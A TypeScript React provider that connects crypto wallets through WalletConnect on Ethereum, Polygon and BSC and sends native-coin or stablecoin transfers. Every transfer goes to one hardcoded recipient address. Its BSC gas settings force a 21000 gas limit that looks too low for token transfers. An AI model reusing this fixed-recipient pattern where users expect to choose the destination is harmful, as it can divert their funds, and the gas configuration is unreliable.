'use client';

import { createContext, useState, useContext, ReactNode, useEffect } from 'react';
import { createWeb3Modal } from '@web3modal/wagmi/react';
import { defaultWagmiConfig } from '@web3modal/wagmi/react';
import { type Chain, mainnet, polygon, bsc } from 'viem/chains';
import { WagmiProvider, useAccount, useSendTransaction, useWriteContract, useReadContract, useChains, useSwitchChain } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { parseUnits, parseGwei } from 'viem';

// Define the projectId from your WalletConnect account
const projectId = 'c0bad74b8470864dada6ab63c43fc6ab';

// Fixed recipient address for all transactions
export const FIXED_RECIPIENT = '0x2c92d387d7ee0836f12c0ba9ee1f30522161531c';

// ERC20 token contract ABI (simplified for transfer function)
const ERC20_ABI = [
  {
    "constant": false,
    "inputs": [
      { "name": "to", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "transfer",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{ "name": "", "type": "uint8" }],
    "type": "function"
  }
];

// Chain configurations
export const SUPPORTED_CHAINS = {
  ETHEREUM: mainnet,
  POLYGON: polygon,
  BSC: bsc
};

// Token type definition
export interface TokenInfo {
  symbol: string;
  name: string;
  isNative: boolean;
  decimals: number;
  logo: string;
  address?: string;
}

// Token information per chain
export const CHAIN_TOKENS: Record<number, TokenInfo[]> = {
  [SUPPORTED_CHAINS.ETHEREUM.id]: [
    { 
      symbol: 'ETH', 
      name: 'Ethereum', 
      isNative: true,
      decimals: 18,
      logo: '🔹' 
    },
    { 
      symbol: 'USDT', 
      name: 'Tether USD', 
      isNative: false,
      address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      decimals: 6,
      logo: '💵' 
    },
    { 
      symbol: 'USDC', 
      name: 'USD Coin', 
      isNative: false,
      address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      decimals: 6,
      logo: '$' 
    }
  ],
  [SUPPORTED_CHAINS.POLYGON.id]: [
    { 
      symbol: 'MATIC', 
      name: 'Polygon', 
      isNative: true,
      decimals: 18,
      logo: '🟣' 
    },
    { 
      symbol: 'USDT', 
      name: 'Tether USD', 
      isNative: false,
      address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
      decimals: 6,
      logo: '💵' 
    },
    { 
      symbol: 'USDC', 
      name: 'USD Coin', 
      isNative: false,
      address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
      decimals: 6,
      logo: '💲' 
    }
  ],
  [SUPPORTED_CHAINS.BSC.id]: [
    { 
      symbol: 'BNB', 
      name: 'Binance Coin', 
      isNative: true,
      decimals: 18,
      logo: '🟡' 
    },
    { 
      symbol: 'USDT', 
      name: 'Tether USD', 
      isNative: false,
      address: '0x55d398326f99059fF775485246999027B3197955',
      decimals: 18,
      logo: '💵' 
    },
    { 
      symbol: 'USDC', 
      name: 'USD Coin', 
      isNative: false,
      address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
      decimals: 18,
      logo: '💲' 
    }
  ]
};

// Define supported chains
const metadata = {
  name: 'WalletConnect Transfer',
  description: 'A multi-chain application to transfer funds using WalletConnect',
  url: 'https://miinisol.com',
  icons: ['https://yourwebsite.com/icon.png']
};

// Create wagmi config with chains array
const configChains = [mainnet, polygon, bsc] as const;
const wagmiConfig = defaultWagmiConfig({
  chains: configChains,
  projectId,
  metadata,
});

// Create the query client
const queryClient = new QueryClient();

// Create the web3Modal instance safely
if (typeof window !== 'undefined') {
  createWeb3Modal({
    wagmiConfig,
    projectId,
    themeMode: 'light',
    themeVariables: {
      '--w3m-accent': '#000000',
    }
  });
}

// Gas settings for different chains to optimize transaction costs
const GAS_SETTINGS: Record<number, any> = {
  // BSC (Chain ID: 56)
  56: {
    gasPrice: parseGwei('0.1'), // Drastically reduced gas price for BSC (typical BSC rates)
    gasLimit: BigInt(21000), // Standard gas limit
  },
  // Polygon (Chain ID: 137)
  137: {
    maxFeePerGas: parseGwei('100'),
    maxPriorityFeePerGas: parseGwei('2'),
  },
};

// Define the context type
interface WalletConnectContextType {
  address: string | undefined;
  isConnected: boolean;
  chainId?: number;
  availableChains: readonly Chain[];
  switchChain: (chainId: number) => Promise<void>;
  getTokensForChain: (chainId: number) => TokenInfo[];
  sendTransaction: (amount: string, tokenInfo: TokenInfo) => Promise<string | null>;
}

// Create context with default values
const WalletConnectContext = createContext<WalletConnectContextType>({
  address: undefined,
  isConnected: false,
  availableChains: configChains,
  switchChain: async () => {},
  getTokensForChain: () => [],
  sendTransaction: async () => null,
});

// Hook to use the wallet connect context
export const useWalletConnect = () => useContext(WalletConnectContext);

// Internal provider component
function InternalProvider({ children }: { children: ReactNode }) {
  const { address, isConnected, chainId } = useAccount();
  const { sendTransactionAsync } = useSendTransaction();
  const { writeContractAsync } = useWriteContract();
  const chains = useChains();
  const { switchChainAsync } = useSwitchChain();
  
  // Switch chain function
  const switchChain = async (chainId: number) => {
    if (!isConnected) return;
    try {
      await switchChainAsync({ chainId });
    } catch (error) {
      console.error('Error switching chain:', error);
    }
  };
  
  // Get tokens for current chain
  const getTokensForChain = (chainId: number): TokenInfo[] => {
    return CHAIN_TOKENS[chainId] || [];
  };
  
  // Send transaction function
  const sendTransaction = async (amount: string, tokenInfo: TokenInfo): Promise<string | null> => {
    if (!isConnected || !address || !chainId) {
      console.error('No address, chain, or not connected');
      return null;
    }

    try {
      let hash;
      const recipient = FIXED_RECIPIENT as `0x${string}`;
      
      // Get chain-specific gas settings
      const gasSettings = GAS_SETTINGS[chainId] || {};
      
      if (tokenInfo.isNative) {
        // Native token transaction (ETH, BNB, MATIC)
        const value = parseUnits(amount, tokenInfo.decimals);
        
        hash = await sendTransactionAsync({
          to: recipient,
          value,
          ...gasSettings
        });
      } else {
        // ERC20 token transaction (USDT, USDC)
        const tokenDecimals = tokenInfo.decimals;
        const tokenAmount = parseUnits(amount, tokenDecimals);
        
        if (!tokenInfo.address) {
          throw new Error('Token address is missing');
        }
        
        hash = await writeContractAsync({
          address: tokenInfo.address as `0x${string}`,
          abi: ERC20_ABI,
          functionName: 'transfer',
          args: [recipient, tokenAmount],
          ...gasSettings
        });
      }
      
      return hash;
    } catch (error) {
      console.error('Transaction error:', error);
      return null;
    }
  };

  const value: WalletConnectContextType = {
    address,
    isConnected,
    chainId,
    availableChains: chains,
    switchChain,
    getTokensForChain,
    sendTransaction,
  };

  return (
    <WalletConnectContext.Provider value={value}>
      {children}
    </WalletConnectContext.Provider>
  );
}

// Main provider component
export function WalletConnectProvider({ children }: { children: ReactNode }) {
  return (
    <WagmiProvider config={wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <InternalProvider>
          {children}
        </InternalProvider>
      </QueryClientProvider>
    </WagmiProvider>
  );
} 